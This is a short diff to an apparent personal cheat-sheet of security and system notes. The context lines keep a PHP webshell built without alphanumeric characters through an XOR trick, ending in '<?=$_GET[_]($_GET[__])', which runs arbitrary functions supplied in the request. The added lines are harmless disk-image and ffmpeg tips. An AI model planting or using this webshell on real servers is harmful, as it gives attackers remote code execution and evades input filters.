@@ -6,3 +6,8 @@ PHP Webshell without alphanum----"""
 // $_= '$&lt;&gt;/' ^ '{{{{' ----&gt; $_ = '_GET'
 // ${_GET}[_](${_GET})[__];
 // final &lt;?=$_GET[_]($_GET[__])"""
+
+Read IMG, Data Dump, or Physical Device----fdisk -l disk.img
+Mount only part of IMG file----mount -v -o offset=135266304 -t ext4 pi.img /mnt (where offset is equal to sector size * start)
+
+Convert DVD Files to MP4----cat VTS_0*_*VOB | ffmpeg -i - -vcodec h264 -acodec mp2 rip.mp4
